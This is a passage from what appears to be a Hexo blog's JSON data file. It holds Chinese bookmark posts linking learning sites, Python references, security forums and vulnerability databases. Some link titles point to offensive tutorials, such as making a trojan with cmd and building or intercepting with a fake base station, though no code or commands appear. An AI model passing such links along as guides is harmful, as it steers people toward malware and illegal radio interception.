Blog](http://www.njstu.net/)\t[聂扬帆博客](http://www.jianshu.com/p/ad44231aff32)\n\n[voovode博客](https://voovode.net/)\t\t[逆向初学](http://blog.chinaunix.net/uid-26275986-id-4333402.html)\n","slug":"书签网址-blog","published":1,"updated":"2017-06-02T01:05:41.460Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12t000ejoo5j9blhydu","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"视频学习\"><a href=\"#视频学习\" class=\"headerlink\" title=\"视频学习\"></a>视频学习</h3><p><a href=\"http://www.runningcheese.com/baiduyun\" target=\"_blank\" rel=\"external\">百度网盘限速绕过</a>    <a href=\"http://blog.binklac.com/links/\" target=\"_blank\" rel=\"external\">博客索引站</a>    <a href=\"http://weibo.com/u/1707085527?is_all=1\" target=\"_blank\" rel=\"external\">aullik5微博</a></p>\n<p><a href=\"http://www.mamicode.com/info-detail-1150231.html\" target=\"_blank\" rel=\"external\">攻防工具</a>    <a href=\"http://www.njstu.net/\" target=\"_blank\" rel=\"external\">ZombieBoy’s Blog</a>    <a href=\"http://www.jianshu.com/p/ad44231aff32\" target=\"_blank\" rel=\"external\">聂扬帆博客</a></p>\n<p><a href=\"https://voovode.net/\" target=\"_blank\" rel=\"external\">voovode博客</a>        <a href=\"http://blog.chinaunix.net/uid-26275986-id-4333402.html\" target=\"_blank\" rel=\"external\">逆向初学</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"视频学习\"><a href=\"#视频学习\" class=\"headerlink\" title=\"视频学习\"></a>视频学习</h3><p><a href=\"http://www.runningcheese.com/baiduyun\" target=\"_blank\" rel=\"external\">百度网盘限速绕过</a>    <a href=\"http://blog.binklac.com/links/\" target=\"_blank\" rel=\"external\">博客索引站</a>    <a href=\"http://weibo.com/u/1707085527?is_all=1\" target=\"_blank\" rel=\"external\">aullik5微博</a></p>\n<p><a href=\"http://www.mamicode.com/info-detail-1150231.html\" target=\"_blank\" rel=\"external\">攻防工具</a>    <a href=\"http://www.njstu.net/\" target=\"_blank\" rel=\"external\">ZombieBoy’s Blog</a>    <a href=\"http://www.jianshu.com/p/ad44231aff32\" target=\"_blank\" rel=\"external\">聂扬帆博客</a></p>\n<p><a href=\"https://voovode.net/\" target=\"_blank\" rel=\"external\">voovode博客</a>        <a href=\"http://blog.chinaunix.net/uid-26275986-id-4333402.html\" target=\"_blank\" rel=\"external\">逆向初学</a></p>\n"},{"title":"书签网址6-->python","date":"2017-02-08T03:55:15.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### Python\n[python通过win32处理word](http://blog.csdn.net/jazywoo123/article/details/18356713)\t\t[python正则表达式](http://www.runoob.com/python/python-reg-expressions.html)\t[win32模块下载](https://sourceforge.net/projects/pywin32/files/)\n\n[python-docx模块](http://python-docx.readthedocs.io/en/latest/index.html)\n\n","source":"_posts/书签网址-python.md","raw":"---\ntitle: 书签网址6-->python\ndate: 2017-02-08 11:55:15\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### Python\n[python通过win32处理word](http://blog.csdn.net/jazywoo123/article/details/18356713)\t\t[python正则表达式](http://www.runoob.com/python/python-reg-expressions.html)\t[win32模块下载](https://sourceforge.net/projects/pywin32/files/)\n\n[python-docx模块](http://python-docx.readthedocs.io/en/latest/index.html)\n\n","slug":"书签网址-python","published":1,"updated":"2017-06-01T09:59:07.169Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g12x000fjoo5l5mcof9s","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h3><p><a href=\"http://blog.csdn.net/jazywoo123/article/details/18356713\" target=\"_blank\" rel=\"external\">python通过win32处理word</a>        <a href=\"http://www.runoob.com/python/python-reg-expressions.html\" target=\"_blank\" rel=\"external\">python正则表达式</a>    <a href=\"https://sourceforge.net/projects/pywin32/files/\" target=\"_blank\" rel=\"external\">win32模块下载</a></p>\n<p><a href=\"http://python-docx.readthedocs.io/en/latest/index.html\" target=\"_blank\" rel=\"external\">python-docx模块</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h3><p><a href=\"http://blog.csdn.net/jazywoo123/article/details/18356713\" target=\"_blank\" rel=\"external\">python通过win32处理word</a>        <a href=\"http://www.runoob.com/python/python-reg-expressions.html\" target=\"_blank\" rel=\"external\">python正则表达式</a>    <a href=\"https://sourceforge.net/projects/pywin32/files/\" target=\"_blank\" rel=\"external\">win32模块下载</a></p>\n<p><a href=\"http://python-docx.readthedocs.io/en/latest/index.html\" target=\"_blank\" rel=\"external\">python-docx模块</a></p>\n"},{"title":"书签网址2-->学习","date":"2017-02-08T01:20:35.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 自学平台\n[PHP 手册](http://php.net/manual/zh/)\t\t[中国黑帽论坛](http://bbs.chinablackhat.com)\t[自强学堂](http://www.ziqiangxuetang.com)\n\n[慕课网](http://www.imooc.com)\t\t[WooYun](https://w00yun.top)\t[Github](https://github.com)\n\n[实验楼](http://www.shiyanlou.com)\t\t[Linux命令大全手册](http://man.linuxde.net)\t\t[农夫安全](http://www.farmsec.org/portal.php)\n\n[Python Challenge](http://www.pythonchallenge.com)\t\t[SQLZOO](http://sqlzoo.net)\t各种数据库执行命令，不同数据库命令的对比等","source":"_posts/书签网址-学习.md","raw":"---\ntitle: 书签网址2-->学习\ndate: 2017-02-08 09:20:35\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 自学平台\n[PHP 手册](http://php.net/manual/zh/)\t\t[中国黑帽论坛](http://bbs.chinablackhat.com)\t[自强学堂](http://www.ziqiangxuetang.com)\n\n[慕课网](http://www.imooc.com)\t\t[WooYun](https://w00yun.top)\t[Github](https://github.com)\n\n[实验楼](http://www.shiyanlou.com)\t\t[Linux命令大全手册](http://man.linuxde.net)\t\t[农夫安全](http://www.farmsec.org/portal.php)\n\n[Python Challenge](http://www.pythonchallenge.com)\t\t[SQLZOO](http://sqlzoo.net)\t各种数据库执行命令，不同数据库命令的对比等","slug":"书签网址-学习","published":1,"updated":"2017-06-01T09:57:06.443Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g130000gjoo5d8nkb1m7","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"自学平台\"><a href=\"#自学平台\" class=\"headerlink\" title=\"自学平台\"></a>自学平台</h3><p><a href=\"http://php.net/manual/zh/\" target=\"_blank\" rel=\"external\">PHP 手册</a>        <a href=\"http://bbs.chinablackhat.com\" target=\"_blank\" rel=\"external\">中国黑帽论坛</a>    <a href=\"http://www.ziqiangxuetang.com\" target=\"_blank\" rel=\"external\">自强学堂</a></p>\n<p><a href=\"http://www.imooc.com\" target=\"_blank\" rel=\"external\">慕课网</a>        <a href=\"https://w00yun.top\" target=\"_blank\" rel=\"external\">WooYun</a>    <a href=\"https://github.com\" target=\"_blank\" rel=\"external\">Github</a></p>\n<p><a href=\"http://www.shiyanlou.com\" target=\"_blank\" rel=\"external\">实验楼</a>        <a href=\"http://man.linuxde.net\" target=\"_blank\" rel=\"external\">Linux命令大全手册</a>        <a href=\"http://www.farmsec.org/portal.php\" target=\"_blank\" rel=\"external\">农夫安全</a></p>\n<p><a href=\"http://www.pythonchallenge.com\" target=\"_blank\" rel=\"external\">Python Challenge</a>        <a href=\"http://sqlzoo.net\" target=\"_blank\" rel=\"external\">SQLZOO</a>    各种数据库执行命令，不同数据库命令的对比等</p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"自学平台\"><a href=\"#自学平台\" class=\"headerlink\" title=\"自学平台\"></a>自学平台</h3><p><a href=\"http://php.net/manual/zh/\" target=\"_blank\" rel=\"external\">PHP 手册</a>        <a href=\"http://bbs.chinablackhat.com\" target=\"_blank\" rel=\"external\">中国黑帽论坛</a>    <a href=\"http://www.ziqiangxuetang.com\" target=\"_blank\" rel=\"external\">自强学堂</a></p>\n<p><a href=\"http://www.imooc.com\" target=\"_blank\" rel=\"external\">慕课网</a>        <a href=\"https://w00yun.top\" target=\"_blank\" rel=\"external\">WooYun</a>    <a href=\"https://github.com\" target=\"_blank\" rel=\"external\">Github</a></p>\n<p><a href=\"http://www.shiyanlou.com\" target=\"_blank\" rel=\"external\">实验楼</a>        <a href=\"http://man.linuxde.net\" target=\"_blank\" rel=\"external\">Linux命令大全手册</a>        <a href=\"http://www.farmsec.org/portal.php\" target=\"_blank\" rel=\"external\">农夫安全</a></p>\n<p><a href=\"http://www.pythonchallenge.com\" target=\"_blank\" rel=\"external\">Python Challenge</a>        <a href=\"http://sqlzoo.net\" target=\"_blank\" rel=\"external\">SQLZOO</a>    各种数据库执行命令，不同数据库命令的对比等</p>\n"},{"title":"书签网址5-->安全论坛","date":"2017-02-08T03:27:27.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 安全论坛\n[CVE中文漏洞信息库](http://cve.scap.org.cn/)\t[SeeBug漏洞洞悉](https://www.seebug.org/)\t[黑客榜中榜](http://www.cn-hack.net/)\n\n[Bugsec](http://www.bugsec.org/)\t[看雪学院](http://www.pediy.com/)\t[游侠安全网](http://www.youxia.org/)\n\n[InfoSecBug Lab](http://www.cnnetsec.com/)\t\t[漏洞时代“0day”](http://0day5.com/)\t\t[暗月博客](http://www.moonsec.com/)\n\n[FREEBUF](http://www.moonsec.com/)\t\t[HACKNEWS国际要闻](http://hackernews.cc/archives/category/%E5%9B%BD%E9%99%85%E8%A6%81%E9%97%BB)\t\t[Metasploit渗透测试论坛](http://www.metasploit.cn/)\n\n[黑麒麟](http://www.hack70.cn/)\t\t[即刻安全](http://www.secist.com/)\t\t[安全牛](http://www.aqniu.com/)\n\n[国家信息安全漏洞共享平台](http://www.cnvd.org.cn/)\t\t[中国国家信息安全漏洞库](http://www.cnnvd.org.cn/)\t\t[Hacking Articles](http://www.hackingarticles.in/penetration-testing/)\n\n[0day漏洞](http://cn.0day.today/)","source":"_posts/书签网址-安全论坛.md","raw":"---\ntitle: 书签网址5-->安全论坛\ndate: 2017-02-08 11:27:27\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 安全论坛\n[CVE中文漏洞信息库](http://cve.scap.org.cn/)\t[SeeBug漏洞洞悉](https://www.seebug.org/)\t[黑客榜中榜](http://www.cn-hack.net/)\n\n[Bugsec](http://www.bugsec.org/)\t[看雪学院](http://www.pediy.com/)\t[游侠安全网](http://www.youxia.org/)\n\n[InfoSecBug Lab](http://www.cnnetsec.com/)\t\t[漏洞时代“0day”](http://0day5.com/)\t\t[暗月博客](http://www.moonsec.com/)\n\n[FREEBUF](http://www.moonsec.com/)\t\t[HACKNEWS国际要闻](http://hackernews.cc/archives/category/%E5%9B%BD%E9%99%85%E8%A6%81%E9%97%BB)\t\t[Metasploit渗透测试论坛](http://www.metasploit.cn/)\n\n[黑麒麟](http://www.hack70.cn/)\t\t[即刻安全](http://www.secist.com/)\t\t[安全牛](http://www.aqniu.com/)\n\n[国家信息安全漏洞共享平台](http://www.cnvd.org.cn/)\t\t[中国国家信息安全漏洞库](http://www.cnnvd.org.cn/)\t\t[Hacking Articles](http://www.hackingarticles.in/penetration-testing/)\n\n[0day漏洞](http://cn.0day.today/)","slug":"书签网址-安全论坛","published":1,"updated":"2017-06-01T09:55:00.861Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g137000hjoo5kzc54zth","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"安全论坛\"><a href=\"#安全论坛\" class=\"headerlink\" title=\"安全论坛\"></a>安全论坛</h3><p><a href=\"http://cve.scap.org.cn/\" target=\"_blank\" rel=\"external\">CVE中文漏洞信息库</a>    <a href=\"https://www.seebug.org/\" target=\"_blank\" rel=\"external\">SeeBug漏洞洞悉</a>    <a href=\"http://www.cn-hack.net/\" target=\"_blank\" rel=\"external\">黑客榜中榜</a></p>\n<p><a href=\"http://www.bugsec.org/\" target=\"_blank\" rel=\"external\">Bugsec</a>    <a href=\"http://www.pediy.com/\" target=\"_blank\" rel=\"external\">看雪学院</a>    <a href=\"http://www.youxia.org/\" target=\"_blank\" rel=\"external\">游侠安全网</a></p>\n<p><a href=\"http://www.cnnetsec.com/\" target=\"_blank\" rel=\"external\">InfoSecBug Lab</a>        <a href=\"http://0day5.com/\" target=\"_blank\" rel=\"external\">漏洞时代“0day”</a>        <a href=\"http://www.moonsec.com/\" target=\"_blank\" rel=\"external\">暗月博客</a></p>\n<p><a href=\"http://www.moonsec.com/\" target=\"_blank\" rel=\"external\">FREEBUF</a>        <a href=\"http://hackernews.cc/archives/category/%E5%9B%BD%E9%99%85%E8%A6%81%E9%97%BB\" target=\"_blank\" rel=\"external\">HACKNEWS国际要闻</a>        <a href=\"http://www.metasploit.cn/\" target=\"_blank\" rel=\"external\">Metasploit渗透测试论坛</a></p>\n<p><a href=\"http://www.hack70.cn/\" target=\"_blank\" rel=\"external\">黑麒麟</a>        <a href=\"http://www.secist.com/\" target=\"_blank\" rel=\"external\">即刻安全</a>        <a href=\"http://www.aqniu.com/\" target=\"_blank\" rel=\"external\">安全牛</a></p>\n<p><a href=\"http://www.cnvd.org.cn/\" target=\"_blank\" rel=\"external\">国家信息安全漏洞共享平台</a>        <a href=\"http://www.cnnvd.org.cn/\" target=\"_blank\" rel=\"external\">中国国家信息安全漏洞库</a>        <a href=\"http://www.hackingarticles.in/penetration-testing/\" target=\"_blank\" rel=\"external\">Hacking Articles</a></p>\n<p><a href=\"http://cn.0day.today/\" target=\"_blank\" rel=\"external\">0day漏洞</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"安全论坛\"><a href=\"#安全论坛\" class=\"headerlink\" title=\"安全论坛\"></a>安全论坛</h3><p><a href=\"http://cve.scap.org.cn/\" target=\"_blank\" rel=\"external\">CVE中文漏洞信息库</a>    <a href=\"https://www.seebug.org/\" target=\"_blank\" rel=\"external\">SeeBug漏洞洞悉</a>    <a href=\"http://www.cn-hack.net/\" target=\"_blank\" rel=\"external\">黑客榜中榜</a></p>\n<p><a href=\"http://www.bugsec.org/\" target=\"_blank\" rel=\"external\">Bugsec</a>    <a href=\"http://www.pediy.com/\" target=\"_blank\" rel=\"external\">看雪学院</a>    <a href=\"http://www.youxia.org/\" target=\"_blank\" rel=\"external\">游侠安全网</a></p>\n<p><a href=\"http://www.cnnetsec.com/\" target=\"_blank\" rel=\"external\">InfoSecBug Lab</a>        <a href=\"http://0day5.com/\" target=\"_blank\" rel=\"external\">漏洞时代“0day”</a>        <a href=\"http://www.moonsec.com/\" target=\"_blank\" rel=\"external\">暗月博客</a></p>\n<p><a href=\"http://www.moonsec.com/\" target=\"_blank\" rel=\"external\">FREEBUF</a>        <a href=\"http://hackernews.cc/archives/category/%E5%9B%BD%E9%99%85%E8%A6%81%E9%97%BB\" target=\"_blank\" rel=\"external\">HACKNEWS国际要闻</a>        <a href=\"http://www.metasploit.cn/\" target=\"_blank\" rel=\"external\">Metasploit渗透测试论坛</a></p>\n<p><a href=\"http://www.hack70.cn/\" target=\"_blank\" rel=\"external\">黑麒麟</a>        <a href=\"http://www.secist.com/\" target=\"_blank\" rel=\"external\">即刻安全</a>        <a href=\"http://www.aqniu.com/\" target=\"_blank\" rel=\"external\">安全牛</a></p>\n<p><a href=\"http://www.cnvd.org.cn/\" target=\"_blank\" rel=\"external\">国家信息安全漏洞共享平台</a>        <a href=\"http://www.cnnvd.org.cn/\" target=\"_blank\" rel=\"external\">中国国家信息安全漏洞库</a>        <a href=\"http://www.hackingarticles.in/penetration-testing/\" target=\"_blank\" rel=\"external\">Hacking Articles</a></p>\n<p><a href=\"http://cn.0day.today/\" target=\"_blank\" rel=\"external\">0day漏洞</a></p>\n"},{"title":"书签网址4-->资源库","date":"2017-02-08T02:12:43.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 资源中心\n[中华人民共和国网络安全法](www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm)\n[花生壳（动态域名解析软件）](http://service.oray.com/question/1696.html)\n[iis显示详细错误](http://www.programgo.com/tag/iis/48836088/2/)\n[CSDN中文IT社区](http://www.csdn.net/?ref=toolbar)\n[Python内建变量的使用](http://www.programgo.com/article/33532851273/)\n[PTESS渗透测试标准](http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf)\n[移动APP漏洞检测](http://bbs.pediy.com/showthread.php?p=1444856#post1444856)\n[hexo搭建Github静态博客](http://www.cnblogs.com/zhcncn/p/4097881.html)\n[Markdown语法](http://www.appinn.com/markdown/#code)\n[入门python爬虫](https://www.zhihu.com/question/20899988)\n[计算机网络原理](http://www.chuanke.com/course/_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86_____.html)\n[Kali下安装shadowsocks](http://www.jianshu.com/p/aa48a0a5b30e)\n[Exploit Database](https://www.exploit-db.com/exploits/36773/)\n[渗透测试-端口转发](http://m.blog.csdn.net/article/details?id=46850329)\n[cmd命令制作木马](http://www.muyierdong.com/wangluoanquanxuexi/3.html)\n[网站攻防-小残博客](https://www.exehack.net/web-3)\n[SecYe网络安全](http://www.secye.com/Network/websafe/list_3_4.html)\n[黑苹果安装论坛](http://blog.chinaunix.net/uid-29345848-id-5104183.html)\n[shodan新手指南](http://www.freebuf.com/sectool/121339.html)\n[burpsuite实战指南](https://t0data.gitbooks.io/burpsuite/)\n[渗透利器大全](http://wolvez.club/)\n","source":"_posts/书签网址-资源库.md","raw":"---\ntitle: 书签网址4-->资源库\ndate: 2017-02-08 10:12:43\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n### 资源中心\n[中华人民共和国网络安全法](www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm)\n[花生壳（动态域名解析软件）](http://service.oray.com/question/1696.html)\n[iis显示详细错误](http://www.programgo.com/tag/iis/48836088/2/)\n[CSDN中文IT社区](http://www.csdn.net/?ref=toolbar)\n[Python内建变量的使用](http://www.programgo.com/article/33532851273/)\n[PTESS渗透测试标准](http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf)\n[移动APP漏洞检测](http://bbs.pediy.com/showthread.php?p=1444856#post1444856)\n[hexo搭建Github静态博客](http://www.cnblogs.com/zhcncn/p/4097881.html)\n[Markdown语法](http://www.appinn.com/markdown/#code)\n[入门python爬虫](https://www.zhihu.com/question/20899988)\n[计算机网络原理](http://www.chuanke.com/course/_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86_____.html)\n[Kali下安装shadowsocks](http://www.jianshu.com/p/aa48a0a5b30e)\n[Exploit Database](https://www.exploit-db.com/exploits/36773/)\n[渗透测试-端口转发](http://m.blog.csdn.net/article/details?id=46850329)\n[cmd命令制作木马](http://www.muyierdong.com/wangluoanquanxuexi/3.html)\n[网站攻防-小残博客](https://www.exehack.net/web-3)\n[SecYe网络安全](http://www.secye.com/Network/websafe/list_3_4.html)\n[黑苹果安装论坛](http://blog.chinaunix.net/uid-29345848-id-5104183.html)\n[shodan新手指南](http://www.freebuf.com/sectool/121339.html)\n[burpsuite实战指南](https://t0data.gitbooks.io/burpsuite/)\n[渗透利器大全](http://wolvez.club/)\n","slug":"书签网址-资源库","published":1,"updated":"2017-05-31T07:58:06.621Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g13a000ijoo5sfm5l9qf","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"资源中心\"><a href=\"#资源中心\" class=\"headerlink\" title=\"资源中心\"></a>资源中心</h3><p><a href=\"www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm\">中华人民共和国网络安全法</a><br><a href=\"http://service.oray.com/question/1696.html\" target=\"_blank\" rel=\"external\">花生壳（动态域名解析软件）</a><br><a href=\"http://www.programgo.com/tag/iis/48836088/2/\" target=\"_blank\" rel=\"external\">iis显示详细错误</a><br><a href=\"http://www.csdn.net/?ref=toolbar\" target=\"_blank\" rel=\"external\">CSDN中文IT社区</a><br><a href=\"http://www.programgo.com/article/33532851273/\" target=\"_blank\" rel=\"external\">Python内建变量的使用</a><br><a href=\"http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf\" target=\"_blank\" rel=\"external\">PTESS渗透测试标准</a><br><a href=\"http://bbs.pediy.com/showthread.php?p=1444856#post1444856\" target=\"_blank\" rel=\"external\">移动APP漏洞检测</a><br><a href=\"http://www.cnblogs.com/zhcncn/p/4097881.html\" target=\"_blank\" rel=\"external\">hexo搭建Github静态博客</a><br><a href=\"http://www.appinn.com/markdown/#code\" target=\"_blank\" rel=\"external\">Markdown语法</a><br><a href=\"https://www.zhihu.com/question/20899988\" target=\"_blank\" rel=\"external\">入门python爬虫</a><br><a href=\"http://www.chuanke.com/course/_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86_____.html\" target=\"_blank\" rel=\"external\">计算机网络原理</a><br><a href=\"http://www.jianshu.com/p/aa48a0a5b30e\" target=\"_blank\" rel=\"external\">Kali下安装shadowsocks</a><br><a href=\"https://www.exploit-db.com/exploits/36773/\" target=\"_blank\" rel=\"external\">Exploit Database</a><br><a href=\"http://m.blog.csdn.net/article/details?id=46850329\" target=\"_blank\" rel=\"external\">渗透测试-端口转发</a><br><a href=\"http://www.muyierdong.com/wangluoanquanxuexi/3.html\" target=\"_blank\" rel=\"external\">cmd命令制作木马</a><br><a href=\"https://www.exehack.net/web-3\" target=\"_blank\" rel=\"external\">网站攻防-小残博客</a><br><a href=\"http://www.secye.com/Network/websafe/list_3_4.html\" target=\"_blank\" rel=\"external\">SecYe网络安全</a><br><a href=\"http://blog.chinaunix.net/uid-29345848-id-5104183.html\" target=\"_blank\" rel=\"external\">黑苹果安装论坛</a><br><a href=\"http://www.freebuf.com/sectool/121339.html\" target=\"_blank\" rel=\"external\">shodan新手指南</a><br><a href=\"https://t0data.gitbooks.io/burpsuite/\" target=\"_blank\" rel=\"external\">burpsuite实战指南</a><br><a href=\"http://wolvez.club/\" target=\"_blank\" rel=\"external\">渗透利器大全</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）</p>\n<h3 id=\"资源中心\"><a href=\"#资源中心\" class=\"headerlink\" title=\"资源中心\"></a>资源中心</h3><p><a href=\"www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm\">中华人民共和国网络安全法</a><br><a href=\"http://service.oray.com/question/1696.html\" target=\"_blank\" rel=\"external\">花生壳（动态域名解析软件）</a><br><a href=\"http://www.programgo.com/tag/iis/48836088/2/\" target=\"_blank\" rel=\"external\">iis显示详细错误</a><br><a href=\"http://www.csdn.net/?ref=toolbar\" target=\"_blank\" rel=\"external\">CSDN中文IT社区</a><br><a href=\"http://www.programgo.com/article/33532851273/\" target=\"_blank\" rel=\"external\">Python内建变量的使用</a><br><a href=\"http://netsec.ccert.edu.cn/hacking/files/2011/07/PTES_MindMap_CN1.pdf\" target=\"_blank\" rel=\"external\">PTESS渗透测试标准</a><br><a href=\"http://bbs.pediy.com/showthread.php?p=1444856#post1444856\" target=\"_blank\" rel=\"external\">移动APP漏洞检测</a><br><a href=\"http://www.cnblogs.com/zhcncn/p/4097881.html\" target=\"_blank\" rel=\"external\">hexo搭建Github静态博客</a><br><a href=\"http://www.appinn.com/markdown/#code\" target=\"_blank\" rel=\"external\">Markdown语法</a><br><a href=\"https://www.zhihu.com/question/20899988\" target=\"_blank\" rel=\"external\">入门python爬虫</a><br><a href=\"http://www.chuanke.com/course/_%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86_____.html\" target=\"_blank\" rel=\"external\">计算机网络原理</a><br><a href=\"http://www.jianshu.com/p/aa48a0a5b30e\" target=\"_blank\" rel=\"external\">Kali下安装shadowsocks</a><br><a href=\"https://www.exploit-db.com/exploits/36773/\" target=\"_blank\" rel=\"external\">Exploit Database</a><br><a href=\"http://m.blog.csdn.net/article/details?id=46850329\" target=\"_blank\" rel=\"external\">渗透测试-端口转发</a><br><a href=\"http://www.muyierdong.com/wangluoanquanxuexi/3.html\" target=\"_blank\" rel=\"external\">cmd命令制作木马</a><br><a href=\"https://www.exehack.net/web-3\" target=\"_blank\" rel=\"external\">网站攻防-小残博客</a><br><a href=\"http://www.secye.com/Network/websafe/list_3_4.html\" target=\"_blank\" rel=\"external\">SecYe网络安全</a><br><a href=\"http://blog.chinaunix.net/uid-29345848-id-5104183.html\" target=\"_blank\" rel=\"external\">黑苹果安装论坛</a><br><a href=\"http://www.freebuf.com/sectool/121339.html\" target=\"_blank\" rel=\"external\">shodan新手指南</a><br><a href=\"https://t0data.gitbooks.io/burpsuite/\" target=\"_blank\" rel=\"external\">burpsuite实战指南</a><br><a href=\"http://wolvez.club/\" target=\"_blank\" rel=\"external\">渗透利器大全</a></p>\n"},{"title":"书签网页7-->终端安全","date":"2017-02-08T05:30:33.000Z","_content":"收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n[伪基站空中信息拦截](http://blog.csdn.net/u011069813/article/details/17075293)\t\t[伪基站相关介绍](http://m.blog.csdn.net/article/details?id=41593985)\n\n[DIY自己的通信系统](http://itindex.net/detail/46016-diy-%E9%80%9A%E4%BF%A1-%E7%B3%BB%E7%BB%9F)\t\t[伪基站制作教程](http://www.wenku1.com/list/%E4%BC%AA%E5%9F%BA%E7%AB%99%E5%88%B6%E4%BD%9C%E6%95%99%E7%A8%8B/)","source":"_posts/书签网页-终端安全.md","raw":"---\ntitle: 书签网页7-->终端安全\ndate: 2017-02-08 13:30:33\ntags:\n---\n收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）\n[伪基站空中信息拦截](http://blog.csdn.net/u011069813/article/details/17075293)\t\t[伪基站相关介绍](http://m.blog.csdn.net/article/details?id=41593985)\n\n[DIY自己的通信系统](http://itindex.net/detail/46016-diy-%E9%80%9A%E4%BF%A1-%E7%B3%BB%E7%BB%9F)\t\t[伪基站制作教程](http://www.wenku1.com/list/%E4%BC%AA%E5%9F%BA%E7%AB%99%E5%88%B6%E4%BD%9C%E6%95%99%E7%A8%8B/)","slug":"书签网页-终端安全","published":1,"updated":"2017-06-01T09:55:54.487Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3f5g13c000jjoo5zdhz2wfm","content":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）<br><a href=\"http://blog.csdn.net/u011069813/article/details/17075293\" target=\"_blank\" rel=\"external\">伪基站空中信息拦截</a>        <a href=\"http://m.blog.csdn.net/article/details?id=41593985\" target=\"_blank\" rel=\"external\">伪基站相关介绍</a></p>\n<p><a href=\"http://itindex.net/detail/46016-diy-%E9%80%9A%E4%BF%A1-%E7%B3%BB%E7%BB%9F\" target=\"_blank\" rel=\"external\">DIY自己的通信系统</a>        <a href=\"http://www.wenku1.com/list/%E4%BC%AA%E5%9F%BA%E7%AB%99%E5%88%B6%E4%BD%9C%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">伪基站制作教程</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>收录平时找到的觉得不错的网址，持续更新。（若有觉得不错的基友欢迎打包发我邮箱“ghsolareric@gmail.com”）<br><a href=\"http://blog.csdn.net/u011069813/article/details/17075293\" target=\"_blank\" rel=\"external\">伪基站空中信息拦截</a>        <a href=\"http://m.blog.csdn.net/article/details?id=41593985\" target=\"_blank\" rel=\"external\">伪基站相关介绍</a></p>\n<p><a href=\"http://itindex.net/detail/46016-diy-%E9%80%9A%E4%BF%A1-%E7%B3%BB%E7%BB%9F\" target=\"_blank\" rel=\"external\">DIY自己的通信系统</a>        <a 